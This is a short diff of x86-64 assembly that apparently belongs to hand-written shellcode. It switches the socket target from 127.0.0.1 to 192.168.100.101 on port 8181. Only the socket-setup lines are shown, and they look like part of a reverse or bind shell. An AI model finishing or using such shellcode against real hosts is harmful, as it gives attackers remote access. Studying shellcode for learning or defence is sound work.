@@ -18,8 +18,7 @@ _start:
 	;; socket variables
 	xor	rax,rax		; rax=NULL
 	push	rax		; push rax
-	push	0x0100007f	; push 127.0.0.1
-	;; push	dword 0x6564a8c0 ; push 192.168.100.101
+	push	dword 0x6564a8c0 ; push 192.168.100.101
 	push 	word 0xf51f	; push 8181(PORT)
 	push	word 0x02	; push 2(AF_INET)
 	mov	rsi,rsp		; rsi=[AF_INET,8181,"192.168.100.101\0"]
